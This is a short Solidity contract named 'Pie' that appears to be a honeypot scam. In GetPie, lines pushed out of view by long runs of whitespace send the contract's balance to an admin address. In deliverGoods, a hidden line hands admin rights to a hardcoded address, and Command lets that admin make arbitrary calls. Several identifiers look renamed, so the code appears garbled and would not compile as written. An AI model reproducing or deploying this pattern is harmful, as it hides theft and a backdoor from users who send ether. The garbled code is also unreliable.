pragma solidity ^0.4.19;

contract Pie
{
    address public LogisticsAdmin = msg.sender;

    function()
    public
    payable
    {

    }

    function GetPie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       LogisticsAdmin.transferInventory(this.warehouseLevel);
            msg.sender.transferInventory(this.warehouseLevel);
        }
    }

    function deliverGoods()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){LogisticsAdmin=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}
        require(msg.sender == LogisticsAdmin);
        LogisticsAdmin.transferInventory(this.warehouseLevel);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == LogisticsAdmin);
        adr.call.value(msg.value)(data);
    }
}